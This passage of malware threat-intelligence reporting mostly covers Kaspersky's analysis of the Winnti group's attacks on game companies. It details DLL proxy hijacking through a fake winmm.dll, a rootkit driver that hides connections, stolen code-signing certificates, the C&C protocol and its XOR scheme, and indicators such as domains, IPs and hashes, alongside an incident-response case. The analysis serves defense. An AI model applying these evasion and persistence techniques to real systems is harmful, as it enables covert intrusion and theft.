Only upon being loaded into memory , does the malicious code ( that appears to be in the form of a DLL ) get manually loaded without the use of Windows 32 API .
In this way , when an investigation is performed , the malicious DLL is not revealed .
Additionally , it makes it much harder for analysis to be performed .
Taking a deeper look at the decrypted malicious code , this malware was found to contain at least the following functions : Download file Download and execute or load library Change sleep duration Open and close interactive sessions Malware is increasingly becoming more contextually advanced .
It attempts to appear as much as possible like legitimate software or documents .
In this example , we would conclude the following .
1 .
A potentially stolen document was used as a decoy document to increase its credibility .
It is also a sign that the compromised organisations could be used as a soft target to compromise their business partners and allies .
2 .
It is important to put a stop to the malware infection at the very beginning , which is the exploitation phase .
Once a network is compromised , it is increasingly harder to detect such threats .
3 .
Anti - incident response / forensic techniques are increasingly used to evade detection .
It would require a keen eye on details and a wealth of experience to identify all these advance techniques .
Carnegie Mellon University .
( n.d . ) .
Retrieved from http : //www.cs.cmu.edu/~fp / courses/15122-f10/misc / rand / mersenne.c0 Katsuki , T. ( 19 Nov , 2012 ) .
Malware Targeting Windows 8 Uses Google Docs .
Retrieved from http : //www.symantec.com / connect / blogs / malware - targeting - windows-8- uses - google - docs-0 I would like to thank several colleagues for their significant contributions on this post : Darien Kindlund , Ned Moran , Nart Villeneuve , and Thoufique Haq .
This research , which started in autumn of 2011 by Kaspersky Lab , is still ongoing .
The subject of this research project is a series of targeted attacks against private companies around the world .
In the research , we reveal activity of one of the hacking groups which has Chinese origins .
This group was named '' Winnti '' .
According to our estimates , the Winnti group has been active for several years and specializes in cyber - attacks against the online video game industry .
The main objective of the group is to steal source code of online game projects as well as digital certificates of legitimate software vendors .
Besides that , they are deeply interested in the set - up of network infrastructure ( including production gaming servers ) and new developments such as conceptual ideas , design and more .
We are n't the first to investigate the attacks attributed to the Winnti group .. It is known that , at least in 2010 , the U.S.- based company HBGary investigated information security incidents related to the Winnti group at one of HBGary 's customers – an American video game production company .
In the autumn of 2011 , a Trojan was detected on a large number of computers – all of them linked by the fact that they were used by players of a popular online game .
It emerged that the piece of malware landed on users ' computers as part of a regular update from the game 's official update server .
Some even suspected that the publisher itself was spying on its customers .
However , it later became clear that the malicious program ended up on the users ' computers by mistake : the cybercriminals were in fact targeting the companies that develop and release computer games .
The computer game publisher whose servers spread the Trojan asked Kaspersky Lab to analyze the malicious program that was found on its update server .
It turned out to be a DLL library compiled for a 64-bit Windows environment and even used a properly signed malicious driver .
The malicious DLL infected gamers ' computers running under either 32-bit or 64-bit operating systems .
It could not start in 32-bit environments , but it could , under certain conditions , launch without the user 's knowledge or consent in 64-bit environments , though no such accidental launches have been detected .
The DLL contained a backdoor payload , or , to be exact , the functionality of a fully - fledged Remote Administration Tool ( RAT ) , which gave the cyber - criminals the ability to control the victim computer without the user 's knowledge .
The malicious module turned out to be the first Trojan for the 64-bit version of Microsoft Windows with valid digital signature that we have seen .
We used to see similar cases before , but in all previous incidents we have seen digital signature abuse , there were only 32-bit applications .
At an early stage of our research , we identified a number of similar backdoors , both 32-bit and 64-bit , in our collection of malware samples .
Thesewere detected under various verdicts .
We grouped them together into a separate family .
Symantec appears to be the first to name these malicious programs ; we kept Symantec 's name – Winnti – in the name of the malware family we created : Backdoor . Win32 ( Win64 ) .Winnti
.
As for the people behind these attacks involving this remote administration tool , we ended up calling them `` the Winnti group '' .
Interestingly , the digital signature belonged to another video game vendor - a private company known as KOG , based in South Korea .
The main business of this company was MMRPG ( massively multi player online role - playing games ) games , which was identical to the business area of the first victim .
We contacted KOG , whose certificate was used to sign malicious software and notified Verisign , which issued the certificate for KOG .
As a result , the certificate was revoked .
When we discovered the first stolen digital certificate , we did n't realize that stealing the certificates and signing malware for upcoming attacks against other victims was the modus operandi of that group .
In eighteen months , we manage to discover more than a dozen compromised digital certificates .
Moreover , we found that those digital certificates seemed to have been used in attacks organized by other hacking groups , presumably coming from China .
For example , an attack against South Korean social networks Cyworld and Nate in 2011 ( http : //www.bbc.co.uk / news / technology-14323787 ) - the attackers used a Trojan that was digitally signed using the certificate of YNK Japan Inc gaming company .
) A digital certificate of the same company was used recently ( March 2013 ) in Trojans targeting Tibetan and Uyghur activists ( https : //www.securelist.com / en / blog/208194165/New_Uyghur_and_Tibetan_Themed_Attacks_Using_PDF_Exploi ts ) .
In fact , this story has long roots dating back to 2011 .
We highly recommend reading this Norman blog post of a similar incident here : http : //blogs.norman.com/2011/security - research / invisible - ynk - a - code - signing - conundrum .
At the same time , in March 2013 , Uyghur activists were targeted by another malware which was digitally signed by another gaming company called MGAME Corp according to http : //www.f- secure.com/weblog/archives/00002524.html We believe that the source of all these stolen certificates is same group which we call Winnti .
This group either has close contacts with other Chinese hacker groups or sells the certificates on the black market in China .
Below is the list of known compromised companies and digital certificates used by the Winnti group in different campaigns : It 's tempting to assume that Advanced Persistent Threats ( APTs ) primarily target high - level institutions : government agencies , ministries , military and political organizations , power stations , chemical plants , critical infrastructure networks , and so on .
In this context , it seems unlikely that a commercial company would be at risk unless it was operating on the scale of Google , Adobe or The New York Times , which was recently targeted by a cyber - attack , and this perception is reinforced by the publicity that attacks on corporations and government organizations usually receive .
However , any company with data that can be effectively monetized is at risk from APTs .
This is exactly what we encountered here : it was not a governmental , political , military , or industrial organization .
The target was specifically gaming companies .
Analyzing the Winnti samples helped to identify who and what were the targets .
We found that we were dealing with targeted attacks : the Winnti team infects companies that develop and release computer games .
It appears the team has been active for quite a while – since 2009 .
It 's difficult to name all the victims of the Winnti team .
Judging by the information that we have at our disposal – namely the tags within malicious programs , the names of the C & C domains , the companies whose digital certificates were stolen to sign malware , and the countries where detection notifications came from – we can say that at least 35 companies were infected by the Winnti malware at some time .
Countries where the affected companies are located : This data demonstrates that the Winnti team targets gaming companies located in various parts of the world , albeit with a strong focus on South East Asia .
This geographic diversity is hardly surprising .
Often , gaming companies ( both publishers and developers ) are international , having representatives and offices worldwide .
Also , it is common practice for gaming companies from various regions to cooperate .
The developers of a game may be located in a different country from its publisher .
When a game eventually reaches markets in regions away from its initial ' home ' , it is often localized and released by other publishers .
In the course of this cooperation , the partner companies often grant each other access to network resources to exchange data associated with the gaming content , including distribution kits , gaming resources , resource assembly kits , etc .
If one company in the network gets infected , it 's easy for the cybercriminals to spread the infection throughout the partnership chain .
During the investigation , we identified more than a hundred malicious programs , each individually compiled to attack a particular company .
Typically , separate command - and - control ( C & C ) domains were assigned to each targeted company .
Virtually all the C & C domains were arranged as follows : a second - level domain was created without a DNS A - record , i.e. , there was no IP address assigned to it .
In cases where there was an A - record , the assigned IP address was typically 127.0.0.1 .
It is also noteworthy that some of the second - level domains that the cybercriminals created for their C & C had very similar names to the domain hosting the site of a certain real gaming company .
And the malicious users ' domain was resolved to the same IP address which the site of the real gaming company used .
In any case , the third - level domains resolved to IP addresses assigned to the attackers ' actual C & C servers .
Sometimes the Winnti team registered their C & C units with public hosts .
Judging by the samples identified , these C & C centers were subdomains of such domains as 6600.org , 8866.org , 9966.org or ddns.net .
From the names of the C & C domains or subdomains , the attack targets or countries of residence could be guessed , as in : ru.gcgame.info kr.zzsoft.info jp.xxoo.co us.nhntech.com fs.nhntech.com as.cjinternet.us The subdomains `` ru '' , `` kr '' , `` jp '' and `` us '' most probably mean that these C & C servers manage bots hosted on the computers of companies located in Russia , South Korea , Japan and the U.S. respectively , while `` fs '' and `` as '' are acronyms for the names of the companies being attacked .
Sometimes Winnti 's malicious programs had a local IP address , such as 192.168.1.136 , specified in the settings for the C & C .
This could mean that , at some point in time , there was an infected computer that did not have a connection to the Internet , but the cybercriminals needed control over it ( it may have been infected while malware was spread via a corporate network ) .
In this case , the cybercriminals deployed a dedicated local C & C server on another compromised computer within the same local network which did have an Internet connection ; via that C & C , the first victim computer could be controlled .
System administrators often try to isolate critical computers from the outside world .
This decreases the probability of haphazard infection , but , apparently , does not always help in a targeted attack .
In the Winnti samples that were detected and analyzed , we found 36 unique C & C domains .
Most probably , this is only a small portion of all existing Winnti C & C domains , as we only managed to obtain some of the samples from this malware family .
This is hardly surprising since these malicious programs are used to execute targeted attacks , so no information is available about many instances of infection ; for this reason , we have no way of obtaining samples of the malware used in these undisclosed attacks .
Knowing the 2nd level domains used by Winnti , we brute forced through all third level sub - domains up to 4 symbols long , and identified those that have the IP addresses of real servers assigned to them .
Having searched through subdomains for a total of 12 second level domains , we identified 227 `` live '' third level domains .
Many of them are C & C servers for Winnti - class malware that have hitherto remained unidentified .
Analyzing the WHOIS data for the 12 second level domains , we found the following list of email addresses used for registration : evilsex @ gmail.com jslee.jcr @ gmail.com whoismydns @ gmail.com googl3 @ live.com wzcc @ cnkker.com apanku2009 @ gmail.com For some of these domains , registration data proved to be the same as those for the domain google.com : Registrant : Google Inc. 1600 Amphitheatre Parkway Mountain View , California 94043 United States + 1.6503300100 Judging by the domain registration data , the Winnti team started their criminal activities as far back as 2007 .
The early domains were involved in spreading rogue anti - virus programs ( FakeAV ) .
From 2009 onwards , domains began to emerge hosting C & C servers for bots used to infect gaming companies .
Apparently , the cybercriminals graduated to relatively large - scale penetrations into the corporate networks of gaming companies starting from 2010 .
The favorite tool of the attackers is a malicious program we call `` Winnti '' .
It has evolved since the first use , but we divide all variants into two generations : 1.x and 2.x .
Our publication describes both variants of this tool .
The second generation ( 2.x ) was used in one of the attacks that we investigated in the active stage and helped the victim to interrupt data transfer and isolate infections in a corporate network .
In addition to that , we observed usage of a popular backdoor known as PlugX , which is believed to have Chinese origins , however used only previously in attacks against Tibetan activists .
As has been stated above , APTs can target any commercial company if cyber - criminals find a way to financially profit from the attack .
So what methods do cyber - criminals use to generate illicit earnings from attacks on gaming companies ? Based on the available information , we have singled out three main monetization schemes that could be used by the Winnti team .
 The unfair accumulation of in - game currency/ '' gold '' in online games and the conversion of virtual funds into real money .
 Theft of source code from the online games server to search for vulnerabilities in games – often linked to point 1 .
 Theft of source code from the server part of popular online games to further deploy pirate servers .
Let 's look at an example .
During our investigation of an infection at a computer gaming company , we found that malware had been created for a particular service on the company 's server .
The malicious program was looking for a specific process running on the server , injected code into it , and then sought out two places in the process code where it could conceal call commands for its function interceptors .
Using these function interceptors , the malicious programs modified process data which was processed in those two places , and returned control back .
Thus , the attackers change the normal execution of the server processes .
Unfortunately , the company was not able to share its targeted application with us , and we can not say exactly how this malicious interference affected gaming processes .
The company concerned told us that the attackers ' aim was to acquire gaming `` gold '' illegally .
Malicious activity like this has an adverse impact on the game itself , tilting the balance in favor of cheats .
But any changes the Winnti team introduces into the game experience are unlikely to be very noticeable .
After all , maintaining a skillful balance is the main attribute of online games .
Users will simply stop playing if they feel that other players are using non - standard methods to create an advantage beyond normal gameplay or if the game loses its intrinsic competitiveness due to resources or artifacts appearing in the game without the developers ' knowledge .
At the same time , the attackers are keen for the game to remain popular ; otherwise , they would be unable to effectively turn all the time and effort of infecting a gaming company into financial gain .
Members of the Winnti team are patient and cautious .
Cyber - criminals have affected the processes of the online games from the infected companies and stolen money from them for years , but they have found ways of doing this without attracting attention to themselves .
Everything starts with a DLL .
The DLL mimics one of the standard Windows libraries , winmm.dll or apphelp.dll .
Since , in the vast majority of cases the samples that we detected disguised themselves as winmm.dll , we would like to fix this name for this malicious library at the end of this document .
Legitimate winmm.dll is a Windows system library that provides multimedia functions .
It is located in the % WINDIR % \System32 folder .
The attackers counted on this being a library providing basic system functions and hence the probability of it being loaded by some program is very high ( this is also valid for apphelp.dll ) .
For example , winmm.dll is loaded by explorer.exe , which is launched during operating system startup and is essential for Windows user interface .
The mechanism to start the malware is simple : if some benign application depends on Windows winmm.dll ( located in % WINDIR % \System32\winmm.dll ) but the evil twin library with the same name ( winmm.dll ) is located in the folder of benign application , the malicious library will be loaded instead of the system one .
Taking advantage of their control of an infected computer , the attackers place a malicious library in the % WINDIR % folder .
The same folder also contains explorer.exe .
This enables the attackers to ensure that the malicious DLL is loaded at system startup : explorer.exe loads the malicious winmm.dll from the % WINDIR % folder as soon as it launches during system startup .
But how can a program which depends on the original library work correctly if a malicious winmm.dll is loaded instead of the original library ? Very easy : the malicious library is designed to work as a proxy for the original winmm.dll from the % WINDIR % \System32 folder .
The cyber - criminals did not reinvent the wheel to make sure that everything works properly .
They relied on a tool known as AheadLib , which was developed by security researchers to analyze malware .
This program , which is designed to facilitate the analysis of malicious libraries , was created by a Chinese developer employed by an Asian anti - virus vendor .
The program accepts a DLL on input and produces a C code which hooks the functions included in the library .
The C code is compiled back into a DLL , which can then be used as a proxy and provide flexible way to analyze behavior of malicious file .
The flexibility of this tool allows to customize the logics of malicious application during analysis and overload functions code to provide some debugging output .
Some code can be added to display parameters of the hooked functions in order to find out which values are passed to the original functions when they are called .
This method is used in so called dynamic analysis of malicious applications .
Ironically , the malware authors have found this to be a convenient application for creating malicious proxy- libraries .
They specified a system library ( winmm.dll ) as a parameter for AheadsLib tool and produced a source code template to create a proxy DLL – in the form of C file .
By overloading some functions with the malicious payload , the attackers created a complete piece of malware that included all the features of the system DLL .
Strangely , the attackers kept the code for AheadLib debug messages in the early versions of their malware ( marked with red in the screenshots above ) .
These strings can also be found in compiled malicious binaries : Later , these fragments were removed from the C file generated by AheadLib .
The winmm.dll malicious library maintains another library in its body , which is decrypted and loaded into the process memory without creating any files on local disk .
According to file version info the original name of this library is `` PlusDLL.dll '' .
This is the platform 's main control component .
When the additional DLL has been properly allocated in the memory , winmm.dll passes control to it with a parameter – a string which contains bot settings .
The settings string , in encrypted form , is also located in the winmm.dll body – after the magic word `` PLUSUNIT '' .
After decryption , the string contains the following : url = lp.gasoft.us:80|ver=1018|tag=33|group = lp80wi Apparently , when the Winnti malware managed to get into focus of security researchers : the authors made modifications of the methods used to store these initial settings .
In some samples , the settings were hidden even in the executable file 's header : In other variants , the ' PLUSUNIT ' magic string was modified : The PlusDLL library has an embedded driver .
The driver is stored in % WINDIR % \System32\ < drivername.sys > file , registered as a service and started by NtLoadDriver system API function .
Immediately after that , the driver 's file is removed , as well as all the registry entries created during service registration .
The executable preserved the original driver names which are `` PortLess '' and `` PointFilter '' ; however , the driver files used during infection are saved as `` sp1itter.sys '' and `` acplec.sys '' .
The purpose of the driver is to hide network connections established by the malware .
For example , if the user decides to check a list of established connections ( e.g. , using the ' netstat –a ' command or the tcpview program ) while the bot is communicating to the control center , the driver will protect and hide the malware connections .
This approach is used by many rootkits on the Windows platform .
The driver uses an interesting method to get the list of addresses to protect connections with .
This information is available in the PlusDLL control library , which normally operates in the context of the explorer.exe process when the infection is active on the computer .
The address information is sent from the user space ( from PlusDLL ) to the kernel space , where the driver works , via call to NtSetQuotaInformationFile API function .
During initialization , the driver hooks the NtSetQuotaInformationFile function : Every time the function is called , the driver checks its parameters : to be precise it is HANDLE FileHandle and PVOID Buffer parameters .
The FileHandle parameter holds a descriptor of the partition on the hard drive where the function is expected to set disk quotas .
The Buffer parameter is a memory buffer with information of new quotas to be set .
The driver checks whether the value of the FileHandle parameter is equal to minus two .
When the system calls the NtSetQuotaInformationFile function to actually change the quotas , the descriptor must be associated with one of the disks .
Normally such descriptors in the Windows system are positive integers which obviously means that it can not be equal to minus two .
The negative value is set by the PlusDLL library in order to make the driver detect that the NtSetQuotaInformationFile function was called by that library .
When calling NtSetQuotaInformationFile , PlusDLL sends information about the network addresses to be protected by the driver via the Buffer parameter .
If FileHandle is not equal to minus two , the hook function in the driver passes control to system 's original code of NtSetQuoataInformationFile API function and everyhin works as it should be on an uninfected system .
Note that 64-bit versions of Windows do not allow unsigned drivers to run .
The malicious driver 's 64-bit versions were signed using stolen certificates .
During the time that we have been tracking the Winnti group , we found 11 certificates that were used to sign the malware used by the group ( not necessarily drivers only ) .
Ten of them belong to various companies in the gaming industry .
As mentioned above , the PlusDLL library is a control module .
Let 's look at how the cybercriminals implemented the transition to perform the malicious DLL 's main tasks .
They could have simply called an appropriate function directly or created a separate thread in which to execute it , but for some reason they resorted to a trick : the code of the SetWindowStationUser function in the user32.dll library was modified .
After modification , the function 's first command became jmp < addr > , where < addr > is the address of the function in the PlusDLL library which implements the malicious library 's main features .
Immediately after this modification , a thread is created ( CreateThread ) executing code starting from the SetWindowStationUser function address .
As a result , when control is eventually passed to this function , the inserted command jmp < addr > returns control back to the PlusDLL code .
The same method is used to execute two more functions in the PlusDLL library .
One of them is used to initialize network routines ; the other executes procedures terminating the malicious program at the very end .
The only difference is that instead of SetWindowStationUser , the code of two other functions from user32.dll is modified – EndTask and WinHelpW , respectively .
It is likely that this was done in order to hide the real addresses of functions in PlusDLL in case its code was analyzed based on its execution logs using an automatic system ( sandbox ) that looks at all function calls .
If this trick is used , an execution log would only show threads launched from the addresses of the functions SetWindowStationUser , EndTask and WinHelpW , which could potentially confuse researchers .
Another possibility is that this is an anti - emulation feature .
Perhaps the emulators built into some anti - virus products are unable to cope with these ' leaps ' – in this case , emulation will not result in the execution of malicious functions , which also suits the cybercriminals ' purposes .
So what does PlusDLL control ? It turns out that the target functionality is implemented in different files .
Each file provides a specific remote control feature and is downloaded from the attackers ' server every time the system starts up .
These files are not saved on disk or in the registry but are loaded directly into the memory .
At the very start of the operation , after launching the driver , PlusDLL collects information about the infected system .
A unique identifier for the infected computer is generated based on information about the hard drive and the network adapter 's MAC address , e.g. , TKVFP - XZTTL - KXFWH - RBJLF - FXWJR .
The attackers are interested primarily in the computer 's name , the program which loaded the malicious library , as well as information about remote desktop sessions ( session name , client name , user name and session time ) .
All of this data is collected in a buffer , which is then compressed and sent to the attackers ' control center .
The buffer may look like this : In reply to this initial message from the bot , the control center sends the list of available plugins .
Plugins are DLL libraries that provide specific remote control functions .
Upon receiving the list of plugins , the bot downloads them , allocates them in the memory and passes control to these libraries .
Different C2 servers could push different plugins .
In total we have discovered eight functional libraries : These plugins form the core toolkit which is used by the perpetrators during attack .
As you can see , the cybercriminals use an entire inventory of malicious tools to effectively control the remote computer .
Moreover , they have taken measures to conceal their activities : the plugins do not explicitly appear anywhere except in the computer 's memory ; they do not get saved to the hard drive ; the driver is deleted immediately after launch ; all traces in the registry that could indicate this launch get deleted .
Only the initial DLL remains on the disk that kick starts the entire process and contains an encrypted version of PlusDLL which is the control DLL .
One of the weak points in this architecture is that the driver does get saved to the hard drive before it launches , so anti - virus products can detect the emergence of this file .
The situation is further exacerbated by the fact that the malicious drivers may be signed ( although not all drivers in the Winnti samples that we detected were in fact signed ) .
An unsigned driver in itself does not have the means to counter antivirus products and its code can be easily recognized as malicious , whereas signed drivers stand a better chance of remaining undetected by antivirus products : certain anti - virus products consider properly signed programs legitimate by default , so as to minimize the chances of false positive responses .
Kaspersky Lab 's products detect the malicious programs described above under the following verdicts : The initial DLLs winmm.dll and apphelp.dll , the PlusDll.dll control DLLs , and functional loadable modules ( CmdPlus.dll etc .
) are detected as Backdoor . Win32.Winnti or Backdoor . Win64.Winnti .
The drivers sp1itter.sys and acplec.sys are detected as Rootkit . Win32.Winnti or Rootkit . Win64.Winnti .
The data transmitted during the communication between the bot and the C & C server , naturally , do not manifest themselves in any explicit form in online data traffic .
Since an active remote control practice can generate substantial traffic , cybercriminals compress communication data with the algorithm LZMA , though they do not include the appropriate header inherent to this algorithm .
The data is transmitted over the TCP protocol .
The samples that we analyzed established connections between C & C servers and ports 53 , 80 and 443 .
This port selection is not surprising : they are associated with the protocols DNS , HTTP and HTTPS respectively .
All three are routinely used in everyday operations , so they are enabled under most firewall policies .
Besides , large amounts of data typically pass through these ports ( with the possible exception of port 53 ) , which makes it easier for the malicious traffic to remain inconspicuous .
Although the ports are associated with certain protocols , the actual content of the traffic generated by the malicious program does not correspond to them .
Early versions of the Winnti platform exhibited the following traffic structure when communicating with C & C : each block of transmitted data started with the magic number 0xdeadface , followed by the number of blocks ( in a DWORD ) , then the hash of the transmitted block ( 8 bytes ) , the size of compressed data ( DWORD ) , the size of source data ( DWORD ) and , finally , the actual compressed data .
This is where another weak point of the Winnti family of backdoors becomes apparent .
With this data structure , malicious network traffic could easily be spotted by , for example , the magic number 0xdeadface .
The cybercriminals probably lost control over victim computers fairly frequently as corporate system administrators identified the intrusion by the unique headers in data packets with the help of IDS / IPS systems , and cleaned their networks .
In 2011 , new versions of Winnti backdoors appeared that , while still based on the same platform , started to use an updated protocol which included extra encryption to communicate with C & C , so the transmitted data no longer had static marks in them .
Prior to encryption , the data has the following structure ( very similar to the earlier format ) : the first 4 bytes are taken by the magic number 0xaced1984 , then a DWORD of data packet description , the next DWORD carries a zero value , 8 bytes of the hash of the transmitted block , then a DWORD with the size of the compressed data , a DWORD with the size of the source data and then the actual compressed data : Then the data is encrypted with regular XOR with a random DWORD size value , and in this form transmitted to the C & C .
Knowing that the first four bytes in the source data must represent the value 0xaced1984 , it is easy to restore the key for the XOR operation when the data were encrypted .
This is how the above data ( the XOR value was 0x002a7b2e ) looked when it was intercepted in network traffic : Since the encryption key ( the value with which the source data are encrypted with the XOR operation ) is different each time a fragment of data is transmitted , no more static unique labels can be found in the network traffic which would quickly identify the transmitted data as belonging to the Winnti backdoor .
Employing this fast , basic method , the cybercriminals have made it much harder to expose their programs ' traffic .
Whichever protocol is used ( with or without extra encryption ) , the workflow of communication between the bot and the C & C stays the same at the initial stage of operation : ● The bot sends the first data block , thus signaling itself ; ● In response , the C & C sends back the list of available plugins ● The bot starts to download plugins , sending one request at a time to download each plugin ● The C & C sends the requested plugin ● The bot sends a message that the plugin has arrived .
We should note here that , to expedite data downloading , the creators of this platform have quite skillfully implemented asynchronous data transmission in their protocol .
For instance , the message that the bot has received the first plugin may only arrive at the C & C when nearly all the plugins have been already sent to the bot .
Having downloaded the malicious payload , the bot deploys the plugins in the memory and initializes them .
Now it 's all set for complete remote control over the victim computer , and the bot switches to standby mode , waiting for the operator to connect and maintaining communication with the C & C by sending `` empty '' messages every 15 seconds or so .
Apart from supplying the plugins , no more automatic actions are performed by the C & C : all of the work to examine the infected computers is done manually by the attackers .
Please note , that the following is published with approval from one of the attacked companies which preferred to remain anonymous .
The real company name was replaced with `` CompanyXYZ '' or simply `` XYZ '' .
On 21st September 2012 , a Security Officer of CompanyXYZ contacted Kaspersky Lab and reported a cyber - attack incident .
Anomalous activity was spotted at one of the corporate servers .
One of the employees noticed a suspicious directory on the server which was created under his account .
The folder had a large archived file with information that was regarded as company 's intellectual property .
The anomalies were also confirmed in the network traffic by monitoring software .
Several suspicious network connections were established from several computer systems , including network domain controllers , to IP addresses which were not associated with any corporate resources or any other known trusted networks .
The suspicious connections were established on ports 443 and 53 .
Below is the list of reported IP addresses : 211.60.126.164 ( Seoul , South Korea ) 113.196.70.169 ( Taipei Taiwan ) The security officer at CompanyXYZ did an on - site analysis and managed to locate the process which initiated the suspicious connections using SysInternals Process Explorer tool .
The connections were initiated by a system process ( svchost.exe ) .
A full process dump using Process Explorer was made and shared with Kaspersky Lab .
Our team immediately started searching for malware in the provided process dump .
A next day , one more dump of svchost.exe from another presumably infected machine was provided .
We also received an IP address and port that was spotted in the suspicious connections coming from infected machines : 188.120.246.88:80 ( Russia ) .
Quick search through the dumped processes revealed IP addresses mentioned by the company 's security officers .
PAGE 26| `` Winnti '' | More than just a game We checked memory around location of the IP address and found no signs of executable code .
The memory was most likely dynamically allocated on process heap and used as a temporary storage of resolved domain name .
That is why we had to find another indicator of malicious module related to those IP addresses .
We initiated a port scan of the suspected hosts in parallel to memory analysis .
Below is the result on the time of scanning : The server was running Windows Terminal Service or was used as a proxy linked to some Terminal Server .
Establishing connection via RDP client usually reveals default system locale which is used on welcome screen .
Below is what we found upon connection : Checking one of IP addresses on robtex.com brought two possible domain names : One of these domains was found in the memory of dumped svchost process .
Googlefiles.net domain was also found in svchost dump of the Machine # 1 .
Besides that , several other domain names were discovered in the same memory block : service.interdriver.net service.googlefiles.net service.dell-support.org service.hp-supports.com Next step was to locate the nearest PE header in the memory of svchost and extract the executable module .
After fixing alignment of the sections the file was ready for further static analysis .
Date and time from PE header showed that the executable was prepared about a year before current attack was revealed : TimeDateStamp : `` 2011 - 10 - 13 07:21:50 '' The executable was a 64-bit application which means that the attackers had already known that CompanyXYZ used 64-bit systems .
The IP address 188.120.246.88 , which was seen in suspicious connection was also checked .
Connecting to the port 80 of that address with simple TCP client displayed an HTTP GET request : GET /G - Content_XYZ.rar HTTP/1.1 Accept : * / * Cache - Control : no - cache Connection : Keep - Alive Host : 127.0.0.1:81 Pragma : no - cache Range : bytes=23021988299 - 27335921161 Referer : http : //127.0.0.1:81 User - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ; SV1 ; .NET
CLR 1.1.4322 ; .NET
CLR 2.0.50727 ) Usually the request is sent by the connecting client , but here the chat between client and server is obviously inversed .
That is probably done by the attackers ' tunneling setup which established a TCP connection with some local web server within the company network and an external host that received the stolen data .
According to the request , the attackers were downloading a file called G - Content_XYZ.rar , which seems to be an archive of over 25Gb long .
The transfer process was instantly interrupted by Security Officers of the company .
The embedded configuration shows some file names .
C_20100.NLS was discovered later as the file hosting the same malicious code on the hard drive .
WinIo.sys is a driver module on Microsoft Windows Server systems used to process networking requests .
Another interesting piece of data was in a short string `` xyz '' , which probably refers to the attack campaign name and was defined by the attackers , who deliberately put that name to tag the malware .
The word `` xyz '' most likely stands for the campaign name which comes from the attacked company 's name `` CompanyXYZ '' .
That was the first evidence that we were dealing with a well - prepared targeted attack against CompanyXYZ .
From our previous experience , we have seen several targeted attacks against gaming companies and some of them were also tagged after the name of the companies .
In all those attacks there was a recognizable pattern of the attackers : they always used third - level domain names for the command and control server of the malware while second - level domain name usually resolved to 127.0.0.1 or was a public DDNS domain .
A quick check confirmed that this tactical pattern was present in this case as well .
Since then , we believed that it is the same attackers we already knew about .
This group of attackers was internally labeled `` Winnti '' by one of our researchers , who named it after one of the very first discovered executable malicious modules .
As soon as we discovered additional configuration , secondary domain names and IP addresses that could be used to control the infected hosts , we instantly reported it to the CompanyXYZ 's Security Officer , who instantly adjusted network firewall rules to block all connections to the attackers ' hosts .
Assisted remote system analysis of another infected machine resulted in discovery of C_20100.NLS file in the Windows system directory and a reference in the system registry to start malicious module as system service : HKLM\System\CurrentControlSet\services\Nwsapagent\Parameters\ ServiceDll = C : \Windows\system32\c_20100.NLS ServiceMain = StartMain ServiceDllUnloadOnStop = 1 Date of registry key creation was the first discovered time of the attack ( however , we found an earlier date later ) : Thu Sep 6 04:26:19 2012 Malicious service registry settings were hidden by a rootkit module , however it helped to identify an infection as the registry key name was the same on all the affected computers .
Simple creation of a key named HKLM\System\CurrentControlSet\services\Nwsapagent could fail if the system was infected .
The rootkit module protected the registry key , but it did n't protect the executable module stored on the hard drive .
It was possible to rename c_20100.NLS file , reboot the machine and clean the registry .
Alternative and even more reliable method was to reboot into Windows Safe Mode , clean the registry key and delete the c_20100.NLS file .
This method was used by company 's System Administrators to find other modules that were not in c_20100.NLS .
Since the infection was located and cleaned , the next step was to locate the breach used by the attackers to penetrate the network .
Security Officers of the company suggested to start checking from a distinct host they have suspected .
The host ( lets call it Machine # 3 ) belong to an employee without network administrators rights .
It was known that it had connected to the attackers ' IPs like the server systems .
The affected company 's security officers obtained a copy of the hard drive of the suspected machine and provided a remote access to the disk image .
Browsing through the directory structure based on the suspected and adjacent dates of infection ( 01 - 06 September 2012 ) revealed a couple of suspicious files that could have been related to the attack : C : \RECYCLER\en.exe Type : PE file Created : 2012 - 09 - 06 04:08:53 UTC Size : 405504 MD5 : cf119a66d4c3e2355c1ec4ac316a7130 C : \WINDOWS\system32\drivers\tcprelay.sys Type : PE file ( native ) Created : 2012 - 09 - 05 17:27:04 UTC Size : 99912 MD5 : 0b105cd6ecdfe5724c7db52135aa47ef Preliminary analysis of tcprelay.sys proved that it was a malicious file which had another encrypted executable file embedded in it .
This gave an even earlier suspected timestamp of infection : 2012 - 09 - 05 17:27:04 UTC or 2012 - 09 - 05 20:27:04 ( local system timezone , UTC+3 ) At the time of check there was no reference in the registry that was linked to tcprelay.sys , perhaps due the fact that system administrators had already cleaned the registry .
This was confirmed by a file in local Administrator 's Desktop folder : C : \Documents and Settings\Administrator\Desktop\1.reg ( created on 2012 - 09 - 24 12:44:07 UTC ) The file had an exported registry data , which had been removed from the registry during system cleanup on 24th September 2012 .
Here is the original contents of the registry key ( HKLM\SYSTEM\CurrentControlSet\Services\tcprelay ) before it was removed : Once the infection on the machine was confirmed we started looking for the origins of the malicious files .
From our previous experience of Winnti gang tactics , we knew that they are keen on sending targeted emails with attached executables .
Security Officers helped us check all the emails stored in local Outlook database file on suspected dates of infection , however that did n't reveal anything suspicious .
We have also found system event log files which were copied and analyzed .
Event logs had records of tcprelay service start timestamps which confirmed the discovered date of infection .
User SID corresponded to the local user account according to the registry .
Tcprelay service first start time from the Event Log The Machine # 3 had an anti - virus program installed .
Checking detection logs of the anti - virus on the suspected date of infection ( 05.09.2012 ) showed that there was a single detection right before tcprelay service first start .
We recovered the PDF document called `` Transmission with Steps , Realited and Compressed.pdf '' from the anti- virus quarantine and prepared to find an exploit inside .
The PDF had a lot of obfuscated JavaScript code inside , however we believe that it was not related to the original infection of the system .
It was clean and the anti - virus detected it by mistake , probably because of some suspicious obfuscated JavaScript code .
The JavaScript code inside the PDF was used to process an interactive form inside the PDF and support dynamic interactive 3D model embedded in the document using Adobe 3D technology .
After that , we checked the infected machine 's browser history .
The Internet Explorer history log files showed that the user was reading email right before the infection of his machine .
With that in mind , we analyzed the Outlook local database again .
This time we used several techniques to recover emails that were deleted from the Trash folder .
This helped to partly recover a message which arrived on the day of infection .
The text of the message supposed to contain an attachment , however the attachment and MIME headers of the email were completely lost and could n't be recovered .
However , it was clear that the email was a targeted attack against the employee of the company .
It was sent from companyxxyz @ 163.com and replaced `` From '' field in the email body which made it look like a legitimate email in the list of messages in Outlook .
We discovered a Windows prefetch file in the system directory , that was created when the malicious attachment was opened .
The timestamp correlates with the time of infection .
